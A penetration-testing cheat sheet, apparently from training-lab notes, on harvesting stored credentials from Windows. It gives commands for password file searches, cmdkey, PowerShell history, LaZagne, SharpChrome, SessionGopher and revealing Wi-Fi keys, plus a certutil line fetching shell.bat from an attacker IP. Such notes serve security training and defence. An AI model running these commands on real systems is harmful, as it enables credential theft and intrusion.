#windows #credentials #lazagne #mimikatz

# Windows Credential Theft

Hunting stored secrets on a Windows host. Related: [privesc](privesc.md) · [password-attacks](../Passwords/password-attacks.md) · [wifi-tools](../WiFi/tools.md)

## Contents
- [File Content Search](#file-content-search)
- [Stored Credentials](#stored-credentials)
- [Tools](#tools)
- [Wireless](#wireless)
- [File Transfer (certutil)](#file-transfer-certutil)

> [!NOTE]
> `certutil.exe` is a built-in, signed Windows binary (a classic LOLBin) — using it to fetch a remote payload is a well-known detection signature for defenders (Sysmon process-creation + command-line logging on `certutil -urlcache`), even though it requires no extra tooling on the attacker side.

## File Content Search
```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
Search filenames/content for "password".

```cmd
findstr /spin "password" *.*
```
Recursive content search with line numbers.

```powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```
Content search with PowerShell.

```powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```
Find credential-bearing file types.

## Stored Credentials
```cmd
cmdkey /list
```
List saved credentials.

```powershell
gc (Get-PSReadLineOption).HistorySavePath
```
Read PowerShell history.

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```
Decrypt stored PowerShell credentials (same-user context).

## Tools

> [!CAUTION]
> SharpChrome and LaZagne touch many well-signatured credential stores (browser DPAPI blobs, password managers, SSH/FTP clients) in one pass — both are heavily flagged by AV/EDR on sight. Expect detection if you run the full `all` sweep.

```cmd
.\SharpChrome.exe logins /unprotect
```
Decrypt saved Chrome credentials.

```cmd
.\lazagne.exe all
```
Dump credentials from many apps (LaZagne).

```powershell
Invoke-SessionGopher -Target WINLPE-SRV01
```
Hunt PuTTY/WinSCP/RDP saved sessions.

## Wireless
```cmd
netsh wlan show profile
```
List saved wireless networks.

```cmd
netsh wlan show profile ilfreight_corp key=clear
```
Reveal a saved wireless password. See [wifi-tools](../WiFi/tools.md).

## File Transfer (certutil)
```cmd
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```
Download a file (`-encode`/`-decode` for base64). See [file-transfers](../Tools/file-transfers.md).
